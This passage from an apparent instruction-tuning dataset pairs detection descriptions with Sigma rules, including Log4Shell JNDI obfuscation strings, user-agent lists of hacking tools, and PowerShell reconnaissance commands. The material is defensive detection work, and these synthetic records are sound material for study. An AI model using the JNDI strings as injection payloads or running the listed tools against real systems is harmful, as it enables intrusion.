'${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}$'\n            - '${${lower:j}ndi:'\n            - '${${upper:j}ndi:'\n            - '${${::-j}${::-n}${::-d}${::-i}:'\n    condition: 1 of selection*\nfalsepositives:\n    - Vulnerability scanning\nlevel: high\n",
      "question": "exploitation attempt against log4j RCE vulnerability reported as CVE-2021-44228 in different header fields found in web server logs (Log4Shell)",
      "answer": "In order to detect exploitation attempts against the log4j RCE vulnerability reported as CVE-2021-44228 in different header fields found in web server logs (Log4Shell), you should monitor web server log entries for specific patterns that indicate an attack attempt. Focus should be on the 'User-Agent', 'URI Query', and 'Referer' header fields of web traffic. These fields are commonly abused by attackers to deliver malicious payloads exploiting the Log4Shell vulnerability. \n\nLook out for the presence of certain key patterns within these fields, which include variations of the JNDI lookup strings such as '${jndi:ldap:/', '${jndi:rmi:/', and others that involve encoded versions of these strings or manipulations aimed at evading simple detection mechanisms (e.g., '${base64:JHtqbmRp', '${${env:BARFOO:-j}', and '${${lower:j}ndi:'). Also, signs of obfuscation like strings containing encoded '${jndi:' and other crafted entries indicating attempts to leverage the Log4Shell vulnerability should be carefully examined.\n\nIt's important to adjust monitoring tools to detect these specific patterns in the 'User-Agent', 'URI Query', and 'Referer' fields to promptly identify and respond to potential exploitation attempts. However, be mindful of possible false positives, such as those that might arise from vulnerability scanning activities, and adjust the detection mechanisms accordingly. The level of threat associated with these detection patterns is considered high, underscoring the necessity of implementing these measures to secure web servers against this critical vulnerability."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting suspicious user agent strings user by hack tools in proxy logs.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect suspicious user agent strings used by hack tools in proxy logs, you should monitor proxy logs for user agent strings that match a list of known vulnerability scanners, brute force tools, SQL Injection tools, and other hacking tools. Look for specific user agent string patterns, such as '(hydra)', ' arachni/', ' BFAC ', and many others, which are indicative of malicious activity. These patterns range from those used by common vulnerability scanners like 'sqlmap' and 'Havij' to brute force tools like 'hydra' and 'brutus', and even more specialized tools like 'ruler', which is known for its use in exploiting Outlook forms for lateral movement and persistence.\n\nWhen such patterns in the user agent string are detected, it is a strong indicator of an attacker probing your systems for vulnerabilities or attempting to breach your defenses. This could involve various vectors such as attempting SQL injection, brute-forcing login screens, or scanning for unpatched vulnerabilities. Keep an eye on the source client IP, the request URI, and the user agent string itself, as these details will be crucial for further investigation.\n\nIt's important to note that while these detections are high indicators of suspicious or malicious activity, there could be false positives, where legitimate software might inadvertently use a user agent string that matches one from the list. However, given the nature of these strings and the context in which they are used, such instances are unknown or rare, thus, the alert level for these detections is considered high.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: proxy\ndetection:\n    selection:\n        c-useragent|contains:\n            # Vulnerability scanner and brute force tools\n            - '(hydra)'\n            - ' arachni/'\n            - ' BFAC '\n            - ' brutus '\n            - ' cgichk '\n            - 'core-project/1.0'\n            - ' crimscanner/'\n            - 'datacha0s'\n            - 'dirbuster'\n            - 'domino hunter'\n            - 'dotdotpwn'\n            - 'FHScan Core'\n            - 'floodgate'\n            - 'get-minimal'\n            - 'gootkit auto-rooter scanner'\n            - 'grendel-scan'\n            - ' inspath '\n            - 'internet ninja'\n            - 'jaascois'\n            - ' zmeu '\n            - 'masscan'\n            - ' metis '\n            - 'morfeus fucking scanner'\n            - 'n-stealth'\n            - 'nsauditor'\n            - 'pmafind'\n            - 'security scan'\n            - 'springenwerk'\n            - 'teh forest lobster'\n            - 'toata dragostea'\n            - ' vega/'\n            - 'voideye'\n            - 'webshag'\n            - 'webvulnscan'\n            - ' whcc/'\n            # SQL Injection\n            - ' Havij'\n            - 'absinthe'\n            - 'bsqlbf'\n            - 'mysqloit'\n            - 'pangolin'\n            - 'sql power injector'\n            - 'sqlmap'\n            - 'sqlninja'\n            - 'uil2pn'\n            # Hack tool\n            - 'ruler'  # https://www.crowdstrike.com/blog/using-outlook-forms-lateral-movement-persistence/\n            - 'Mozilla/5.0 (Windows; U; Windows NT 5.1; pt-PT; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2 (.NET CLR 3.5.30729)'  # SQLi Dumper\n    condition: selection\nfields:\n    - ClientIP\n    - c-uri\n    - c-useragent\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: proxy\ndetection:\n    selection:\n        c-useragent|contains:\n            # Vulnerability scanner and brute force tools\n            - '(hydra)'\n            - ' arachni/'\n            - ' BFAC '\n            - ' brutus '\n            - ' cgichk '\n            - 'core-project/1.0'\n            - ' crimscanner/'\n            - 'datacha0s'\n            - 'dirbuster'\n            - 'domino hunter'\n            - 'dotdotpwn'\n            - 'FHScan Core'\n            - 'floodgate'\n            - 'get-minimal'\n            - 'gootkit auto-rooter scanner'\n            - 'grendel-scan'\n            - ' inspath '\n            - 'internet ninja'\n            - 'jaascois'\n            - ' zmeu '\n            - 'masscan'\n            - ' metis '\n            - 'morfeus fucking scanner'\n            - 'n-stealth'\n            - 'nsauditor'\n            - 'pmafind'\n            - 'security scan'\n            - 'springenwerk'\n            - 'teh forest lobster'\n            - 'toata dragostea'\n            - ' vega/'\n            - 'voideye'\n            - 'webshag'\n            - 'webvulnscan'\n            - ' whcc/'\n            # SQL Injection\n            - ' Havij'\n            - 'absinthe'\n            - 'bsqlbf'\n            - 'mysqloit'\n            - 'pangolin'\n            - 'sql power injector'\n            - 'sqlmap'\n            - 'sqlninja'\n            - 'uil2pn'\n            # Hack tool\n            - 'ruler'  # https://www.crowdstrike.com/blog/using-outlook-forms-lateral-movement-persistence/\n            - 'Mozilla/5.0 (Windows; U; Windows NT 5.1; pt-PT; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2 (.NET CLR 3.5.30729)'  # SQLi Dumper\n    condition: selection\nfields:\n    - ClientIP\n    - c-uri\n    - c-useragent\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "suspicious user agent strings user by hack tools in proxy logs",
      "answer": "In order to detect suspicious user agent strings used by hack tools in proxy logs, you should monitor proxy logs for user agent strings that match a list of known vulnerability scanners, brute force tools, SQL Injection tools, and other hacking tools. Look for specific user agent string patterns, such as '(hydra)', ' arachni/', ' BFAC ', and many others, which are indicative of malicious activity. These patterns range from those used by common vulnerability scanners like 'sqlmap' and 'Havij' to brute force tools like 'hydra' and 'brutus', and even more specialized tools like 'ruler', which is known for its use in exploiting Outlook forms for lateral movement and persistence.\n\nWhen such patterns in the user agent string are detected, it is a strong indicator of an attacker probing your systems for vulnerabilities or attempting to breach your defenses. This could involve various vectors such as attempting SQL injection, brute-forcing login screens, or scanning for unpatched vulnerabilities. Keep an eye on the source client IP, the request URI, and the user agent string itself, as these details will be crucial for further investigation.\n\nIt's important to note that while these detections are high indicators of suspicious or malicious activity, there could be false positives, where legitimate software might inadvertently use a user agent string that matches one from the list. However, given the nature of these strings and the context in which they are used, such instances are unknown or rare, thus, the alert level for these detections is considered high."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Commandlet name for PrintNightmare exploitation..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect Commandlet name for PrintNightmare exploitation, you should monitor Windows PowerShell script logs, ensuring that Script Block Logging is enabled. Focus on identifying instances where the script text contains the command 'Invoke-Nightmare'. This specific commandlet is indicative of attempts to exploit the PrintNightmare vulnerability. Since this detection is critical, the alert level is set to high, although it's worth noting that due to the specificity of the search, false positives are considered unknown or rare.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: ps_script\n    definition: Script Block Logging must be enabled\ndetection:\n    selection:\n        ScriptBlockText|contains: 'Invoke-Nightmare'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: ps_script\n    definition: Script Block Logging must be enabled\ndetection:\n    selection:\n        ScriptBlockText|contains: 'Invoke-Nightmare'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "Commandlet name for PrintNightmare exploitation.",
      "answer": "In order to detect Commandlet name for PrintNightmare exploitation, you should monitor Windows PowerShell script logs, ensuring that Script Block Logging is enabled. Focus on identifying instances where the script text contains the command 'Invoke-Nightmare'. This specific commandlet is indicative of attempts to exploit the PrintNightmare vulnerability. Since this detection is critical, the alert level is set to high, although it's worth noting that due to the specificity of the search, false positives are considered unknown or rare."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Windows services that got terminated for whatever reason.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to Detects Windows services that got terminated for whatever reason, you should: Focus on monitoring Windows system service logs, specifically targeting those generated by the Service Control Manager. The detection strategy hinges on identifying event logs where the Provider Name matches 'Service Control Manager' and the Event ID is 7023, which indicates that a service has been terminated, citing an error for the termination. While implementing this monitoring, bear in mind that encountering such events does not invariably signify malicious activity. Service terminations can occur for a variety of non-malicious reasons, hence such events are generally considered to have a low level of threat severity. Identifying these events can nonetheless be crucial for maintaining system integrity and security, providing valuable insights into potential operational issues or malicious disruptions within the Windows services framework.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    service: system\ndetection:\n    selection:\n        Provider_Name: 'Service Control Manager'\n        EventID: 7023 # The X Service service terminated with the following error\n    condition: selection\nfalsepositives:\n    - False positives could occur since service termination could happen due to multiple reasons\nlevel: low\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    service: system\ndetection:\n    selection:\n        Provider_Name: 'Service Control Manager'\n        EventID: 7023 # The X Service service terminated with the following error\n    condition: selection\nfalsepositives:\n    - False positives could occur since service termination could happen due to multiple reasons\nlevel: low\n",
      "question": "Windows services that got terminated for whatever reason",
      "answer": "In order to Detects Windows services that got terminated for whatever reason, you should: Focus on monitoring Windows system service logs, specifically targeting those generated by the Service Control Manager. The detection strategy hinges on identifying event logs where the Provider Name matches 'Service Control Manager' and the Event ID is 7023, which indicates that a service has been terminated, citing an error for the termination. While implementing this monitoring, bear in mind that encountering such events does not invariably signify malicious activity. Service terminations can occur for a variety of non-malicious reasons, hence such events are generally considered to have a low level of threat severity. Identifying these events can nonetheless be crucial for maintaining system integrity and security, providing valuable insights into potential operational issues or malicious disruptions within the Windows services framework."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Adversaries may attempt to find domain-level groups and permission settings.\nThe knowledge of domain-level permission groups can help adversaries determine which groups exist and which users belong to a particular group.\nAdversaries may use this information to determine which users have elevated permissions, such as domain administrators.\n.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect adversaries attempting to find domain-level groups and permission settings, you should focus on monitoring PowerShell script activity within Windows environments. Specifically, you should ensure that Script Block Logging is enabled to capture detailed information about script execution. Look for scripts containing specific commands that are frequently used in reconnaissance activities to gather information about domain groups and user permissions. Detecting the use of the `get-ADPrincipalGroupMembership` command is crucial as adversaries may use it to determine the membership of specific domain-level groups. Additionally, identifying scripts that combine the `get-aduser` command with parameters like '-f ' (filter), '-pr ' (properties), and the string 'DoesNotRequirePreAuth' is important. This combination is often used to query for users who have properties that could be exploited, such as not requiring pre-authentication, which can indicate users with potentially elevated permissions or vulnerabilities in their configuration. Monitoring for these patterns and commands in PowerShell script blocks can help identify reconnaissance activities aimed at uncovering domain group memberships and permissions settings. It's essential to keep in mind that these detections can sometimes yield false positives, so they are considered to have a low level of confidence by default.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: ps_script\n    definition: 'Requirements: Script Block Logging must be enabled'\ndetection:\n    test_2:\n        ScriptBlockText|contains: get-ADPrincipalGroupMembership\n    test_7:\n        ScriptBlockText|contains|all:\n            - get-aduser\n            - '-f '\n            - '-pr '\n            - DoesNotRequirePreAuth\n    condition: 1 of test_*\nfalsepositives:\n    - Unknown\nlevel: low\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: ps_script\n    definition: 'Requirements: Script Block Logging must be enabled'\ndetection:\n    test_2:\n        ScriptBlockText|contains: get-ADPrincipalGroupMembership\n    test_7:\n        ScriptBlockText|contains|all:\n            - get-aduser\n            - '-f '\n            - '-pr '\n            - DoesNotRequirePreAuth\n    condition: 1 of test_*\nfalsepositives:\n    - Unknown\nlevel: low\n",
      "question": "Adversaries may attempt to find domain-level groups and permission settings.\nThe knowledge of domain-level permission groups can help adversaries determine which groups exist and which users belong to a particular group.\nAdversaries may use this information to determine which users have elevated permissions, such as domain administrators.\n",
      "answer": "In order to detect adversaries attempting to find domain-level groups and permission settings, you should focus on monitoring PowerShell script activity within Windows environments. Specifically, you should ensure that Script Block Logging is enabled to capture detailed information about script execution. Look for scripts containing specific commands that are frequently used in reconnaissance activities to gather information about domain groups and user permissions. Detecting the use of the `get-ADPrincipalGroupMembership` command is crucial as adversaries may use it to determine the membership of specific domain-level groups. Additionally, identifying scripts that combine the `get-aduser` command with parameters like '-f ' (filter), '-pr ' (properties), and the string 'DoesNotRequirePreAuth' is important. This combination is often used to query for users who have properties that could be exploited, such as not requiring pre-authentication, which can indicate users with potentially elevated permissions or vulnerabilities in their configuration. Monitoring for these patterns and commands in PowerShell script blocks can help identify reconnaissance activities aimed at uncovering domain group memberships and permissions settings. It's essential to keep in mind that these detections can sometimes yield false positives, so they are considered to have a low level of confidence by default."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting anyone attempting a backup for the DPAPI Master Key. This events gets generated at the source and not the Domain Controller..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect anyone attempting a backup for the DPAPI Master Key, which is an event generated at the source and not the Domain Controller, you should monitor security logs from Windows systems for the event ID 4692. This specific event ID is triggered when there's an attempt to backup the Data Protection API (DPAPI) Master Key. Pay particular attention to fields such as ComputerName, SubjectDomainName, and SubjectUserName within these logs to help identify the source and context of the attempt. It's worth noting that false positives may occur if a computer is part of a domain because DPAPI employs a backup mechanism to allow unprotection of the data, which can trigger this event. The risk level associated with this detection is considered medium.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    service: security\ndetection:\n    selection:\n        EventID: 4692\n    condition: selection\nfields:\n    - ComputerName\n    - SubjectDomainName\n    - SubjectUserName\nfalsepositives:\n    - If a computer is a member of a domain, DPAPI has a backup mechanism to allow unprotection of the data. Which will trigger this event.\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    service: security\ndetection:\n    selection:\n        EventID: 4692\n    condition: selection\nfields:\n    - ComputerName\n    - SubjectDomainName\n    - SubjectUserName\nfalsepositives:\n    - If a computer is a member of a domain, DPAPI has a backup mechanism to allow unprotection of the data. Which will trigger this event.\nlevel: medium\n",
      "question": "anyone attempting a backup for the DPAPI Master Key. This events gets generated at the source and not the Domain Controller.",
      "answer": "In order to detect anyone attempting a backup for the DPAPI Master Key, which is an event generated at the source and not the Domain Controller, you should monitor security logs from Windows systems for the event ID 4692. This specific event ID is triggered when there's an attempt to backup the Data Protection API (DPAPI) Master Key. Pay particular attention to fields such as ComputerName, SubjectDomainName, and SubjectUserName within these logs to help identify the source and context of the attempt. It's worth noting that false positives may occur if a computer is part of a domain because DPAPI employs a backup mechanism to allow unprotection of the data, which can trigger this event. The risk level associated with this detection is considered medium."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting various command line and scripting engines/processes such as \"PowerShell\", \"Wscript\", \"Cmd\", etc. spawning a \"regsvr32\" instance..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect various command line and scripting engines/processes such as \"PowerShell\", \"Wscript\", \"Cmd\", etc. spawning a \"regsvr32\" instance, you should: Monitor process creation events on Windows systems, looking specifically for instances where command line interpreters or scripting engines like cmd.exe, cscript.exe, mshta.exe, powershell_ise.exe, powershell.exe, pwsh.exe, and wscript.exe initiate the process regsvr32.exe. It's important to filter out and exclude legitimate uses of these scripts, as well as some Windows services to reduce false positives. Notably, an instance where cmd.exe is used to start \"regsvr32.exe\" specifically with a command line ending in '/s C:\\Windows\\System32\\RpcProxy\\RpcProxy.dll' should be excluded from this detection to avoid false flags on legitimate usage. This monitoring approach aims to detect malicious activities while minimizing the chance of misidentifying benign behaviors commonly observed in enterprise environments.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith:\n            - '\\cmd.exe'\n            - '\\cscript.exe'\n            - '\\mshta.exe'\n            - '\\powershell_ise.exe'\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n            - '\\wscript.exe'\n        Image|endswith: '\\regsvr32.exe'\n    filter_main_rpcproxy:\n        ParentImage: C:\\Windows\\System32\\cmd.exe\n        CommandLine|endswith: ' /s C:\\Windows\\System32\\RpcProxy\\RpcProxy.dll'\n    condition: selection and not 1 of filter_main_*\nfalsepositives:\n    - Legitimate \".bat\", \".hta\", \".ps1\" or \".vbs\" scripts leverage legitimately often. Apply additional filter and exclusions as necessary\n    - Some legitimate Windows services\nlevel: medium # Can be reduced to low if you experience a ton of FP\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith:\n            - '\\cmd.exe'\n            - '\\cscript.exe'\n            - '\\mshta.exe'\n            - '\\powershell_ise.exe'\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n            - '\\wscript.exe'\n        Image|endswith: '\\regsvr32.exe'\n    filter_main_rpcproxy:\n        ParentImage: C:\\Windows\\System32\\cmd.exe\n        CommandLine|endswith: ' /s C:\\Windows\\System32\\RpcProxy\\RpcProxy.dll'\n    condition: selection and not 1 of filter_main_*\nfalsepositives:\n    - Legitimate \".bat\", \".hta\", \".ps1\" or \".vbs\" scripts leverage legitimately often. Apply additional filter and exclusions as necessary\n    - Some legitimate Windows services\nlevel: medium # Can be reduced to low if you experience a ton of FP\n",
      "question": "various command line and scripting engines/processes such as \"PowerShell\", \"Wscript\", \"Cmd\", etc. spawning a \"regsvr32\" instance.",
      "answer": "In order to detect various command line and scripting engines/processes such as \"PowerShell\", \"Wscript\", \"Cmd\", etc. spawning a \"regsvr32\" instance, you should: Monitor process creation events on Windows systems, looking specifically for instances where command line interpreters or scripting engines like cmd.exe, cscript.exe, mshta.exe, powershell_ise.exe, powershell.exe, pwsh.exe, and wscript.exe initiate the process regsvr32.exe. It's important to filter out and exclude legitimate uses of these scripts, as well as some Windows services to reduce false positives. Notably, an instance where cmd.exe is used to start \"regsvr32.exe\" specifically with a command line ending in '/s C:\\Windows\\System32\\RpcProxy\\RpcProxy.dll' should be excluded from this detection to avoid false flags on legitimate usage. This monitoring approach aims to detect malicious activities while minimizing the chance of misidentifying benign behaviors commonly observed in enterprise environments."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Adversaries can interact with the DACLs using built-in Windows commands takeown which can grant adversaries higher permissions on specific files and folders.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect when adversaries can interact with the DACLs using built-in Windows commands like takeown which can grant them higher permissions on specific files and folders, you should focus on monitoring process creation logs in Windows environments. Specifically, look for instances where the process image name ends with '\\takeown.exe' indicating the execution of the takeown command. In addition, it is important to check the command line arguments for the presence of both '/f ' and '/r', as these flags are typically used to force the command to act on specified files or folders and to apply the action recursively, respectively. These indicators might suggest an attempt to modify Discretionary Access Control Lists (DACLs) to gain unauthorized access or escalate privileges. It's essential to pay attention to logs that capture both the command line and the parent command line fields to understand the context of the execution. However, be aware of potential false positives, which may arise from scripts created by developers and admins or other legitimate administrative activities. This detection has a medium level of confidence due to the possible legitimate use of the takeown command in administrative contexts.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\takeown.exe'\n        CommandLine|contains|all:\n            - '/f '\n            - '/r'\n    condition: selection\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Scripts created by developers and admins\n    - Administrative activity\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\takeown.exe'\n        CommandLine|contains|all:\n            - '/f '\n            - '/r'\n    condition: selection\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Scripts created by developers and admins\n    - Administrative activity\nlevel: medium\n",
      "question": "Adversaries can interact with the DACLs using built-in Windows commands takeown which can grant adversaries higher permissions on specific files and folders",
      "answer": "In order to detect when adversaries can interact with the DACLs using built-in Windows commands like takeown which can grant them higher permissions on specific files and folders, you should focus on monitoring process creation logs in Windows environments. Specifically, look for instances where the process image name ends with '\\takeown.exe' indicating the execution of the takeown command. In addition, it is important to check the command line arguments for the presence of both '/f ' and '/r', as these flags are typically used to force the command to act on specified files or folders and to apply the action recursively, respectively. These indicators might suggest an attempt to modify Discretionary Access Control Lists (DACLs) to gain unauthorized access or escalate privileges. It's essential to pay attention to logs that capture both the command line and the parent command line fields to understand the context of the execution. However, be aware of potential false positives, which may arise from scripts created by developers and admins or other legitimate administrative activities. This detection has a medium level of confidence due to the possible legitimate use of the takeown command in administrative contexts."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting guest users being invited to tenant by non-approved inviters.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect guest users being invited to tenant by non-approved inviters, you should:\n\nMonitor the audit logs from Azure, specifically focusing on user management activities. Look for operations named 'Invite external user' which are carried out under the 'UserManagement' category. It is essential to filter out actions initiated by approved guest inviters, which will require maintaining a list of such entities. If an invitation to an external user is detected and it does not come from any approved inviter, it should be considered a potential security threat. This detection mechanism is crucial for identifying unauthorized attempts to add guest users to your tenant, which could potentially lead to unauthorized access or other security complications. False positives might occur if the activity was actually approved by a System Administrator, hence it's fundamental to verify such actions with the respective administrators. The severity of this kind of alert is considered medium, as it might indicate an attempt to compromise your environment or violate policy but might also be a legitimate action that hasn't been properly flagged as approved. Tags associated with this detection strategy include Persistence, Initial Access, and the relevant technique External Remote Services, reflecting the MITRE ATT&CK framework's classification of such security concerns.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: azure\n    service: auditlogs\ndetection:\n    selection:\n        Category: 'UserManagement'\n        OperationName: 'Invite external user'\n    filter:\n        InitiatedBy|contains: '<approved guest inviter use OR for multiple>'\n    condition: selection and not filter\nfalsepositives:\n    - If this was approved by System Administrator.\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: azure\n    service: auditlogs\ndetection:\n    selection:\n        Category: 'UserManagement'\n        OperationName: 'Invite external user'\n    filter:\n        InitiatedBy|contains: '<approved guest inviter use OR for multiple>'\n    condition: selection and not filter\nfalsepositives:\n    - If this was approved by System Administrator.\nlevel: medium\n",
      "question": "guest users being invited to tenant by non-approved inviters",
      "answer": "In order to detect guest users being invited to tenant by non-approved inviters, you should:\n\nMonitor the audit logs from Azure, specifically focusing on user management activities. Look for operations named 'Invite external user' which are carried out under the 'UserManagement' category. It is essential to filter out actions initiated by approved guest inviters, which will require maintaining a list of such entities. If an invitation to an external user is detected and it does not come from any approved inviter, it should be considered a potential security threat. This detection mechanism is crucial for identifying unauthorized attempts to add guest users to your tenant, which could potentially lead to unauthorized access or other security complications. False positives might occur if the activity was actually approved by a System Administrator, hence it's fundamental to verify such actions with the respective administrators. The severity of this kind of alert is considered medium, as it might indicate an attempt to compromise your environment or violate policy but might also be a legitimate action that hasn't been properly flagged as approved. Tags associated with this detection strategy include Persistence, Initial Access, and the relevant technique External Remote Services, reflecting the MITRE ATT&CK framework's classification of such security concerns."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting when the 'AllowMultipleTSSessions' value is enabled.\nWhich allows for multiple Remote Desktop connection sessions to be opened at once.\nThis is often used by attacker as a way to connect to an RDP session without disconnecting the other users\n.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect when the 'AllowMultipleTSSessions' value is enabled, which allows for multiple Remote Desktop connection sessions to be opened at once and is often used by attackers as a way to connect to an RDP session without disconnecting the other users, you should: Monitor the Windows Registry settings for changes specifically aimed at enabling the 'AllowMultipleTSSessions' functionality. This involves tracking the event when a value is set (SetValue event type) in the registry at the location '\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\AllowMultipleTSSessions' that changes its value to DWORD (0x00000001), which effectively allows multiple TS sessions. Be aware that there might be legitimate use cases for enabling this feature; hence, not every detection might indicate a malicious activity. This detection is classified with a medium level of importance. The associated MITRE ATT&CK tactics and techniques for understanding this activity focus on Persistence, Privilege Escalation, and Lateral Movement, as this behavior is exploited by attackers to maintain access to and control over a connected system without disrupting other users' sessions.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: registry_set\n    product: windows\ndetection:\n    selection:\n        EventType: SetValue\n        TargetObject|endswith: '\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\AllowMultipleTSSessions'\n        Details|endswith: DWORD (0x00000001)\n    condition: selection\nfalsepositives:\n    - Legitimate use of the multi session functionality\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: registry_set\n    product: windows\ndetection:\n    selection:\n        EventType: SetValue\n        TargetObject|endswith: '\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\AllowMultipleTSSessions'\n        Details|endswith: DWORD (0x00000001)\n    condition: selection\nfalsepositives:\n    - Legitimate use of the multi session functionality\nlevel: medium\n",
      "question": "when the 'AllowMultipleTSSessions' value is enabled.\nWhich allows for multiple Remote Desktop connection sessions to be opened at once.\nThis is often used by attacker as a way to connect to an RDP session without disconnecting the other users\n",
      "answer": "In order to detect when the 'AllowMultipleTSSessions' value is enabled, which allows for multiple Remote Desktop connection sessions to be opened at once and is often used by attackers as a way to connect to an RDP session without disconnecting the other users, you should: Monitor the Windows Registry settings for changes specifically aimed at enabling the 'AllowMultipleTSSessions' functionality. This involves tracking the event when a value is set (SetValue event type) in the registry at the location '\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\AllowMultipleTSSessions' that changes its value to DWORD (0x00000001), which effectively allows multiple TS sessions. Be aware that there might be legitimate use cases for enabling this feature; hence, not every detection might indicate a malicious activity. This detection is classified with a medium level of importance. The associated MITRE ATT&CK tactics and techniques for understanding this activity focus on Persistence, Privilege Escalation, and Lateral Movement, as this behavior is exploited by attackers to maintain access to and control over a connected system without disrupting other users' sessions."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting execution of msiexec.exe from an uncommon directory.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the execution of msiexec.exe from an uncommon directory, you should: monitor the creation of processes on Windows systems, specifically focusing on instances where the process image ends with '\\msiexec.exe' or the OriginalFileName is specified as '\\msiexec.exe'. However, it's crucial to exclude any occurrences that originate from common, legitimate directories for msiexec.exe, such as 'C:\\Windows\\System32\\', 'C:\\Windows\\SysWOW64\\', and 'C:\\Windows\\WinSxS\\'. This approach helps in identifying potentially malicious activities where msiexec.exe is executed from directories that are not typically used for legitimate purposes, which is a tactic often employed in various attacks.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith: '\\msiexec.exe'\n        - OriginalFileName: '\\msiexec.exe'\n    filter:\n        Image|startswith:\n            - 'C:\\Windows\\System32\\'\n            - 'C:\\Windows\\SysWOW64\\'\n            - 'C:\\Windows\\WinSxS\\'\n    condition: selection and not filter\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith: '\\msiexec.exe'\n        - OriginalFileName: '\\msiexec.exe'\n    filter:\n        Image|startswith:\n            - 'C:\\Windows\\System32\\'\n            - 'C:\\Windows\\SysWOW64\\'\n            - 'C:\\Windows\\WinSxS\\'\n    condition: selection and not filter\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "execution of msiexec.exe from an uncommon directory",
      "answer": "In order to detect the execution of msiexec.exe from an uncommon directory, you should: monitor the creation of processes on Windows systems, specifically focusing on instances where the process image ends with '\\msiexec.exe' or the OriginalFileName is specified as '\\msiexec.exe'. However, it's crucial to exclude any occurrences that originate from common, legitimate directories for msiexec.exe, such as 'C:\\Windows\\System32\\', 'C:\\Windows\\SysWOW64\\', and 'C:\\Windows\\WinSxS\\'. This approach helps in identifying potentially malicious activities where msiexec.exe is executed from directories that are not typically used for legitimate purposes, which is a tactic often employed in various attacks."
    }
  },
  {
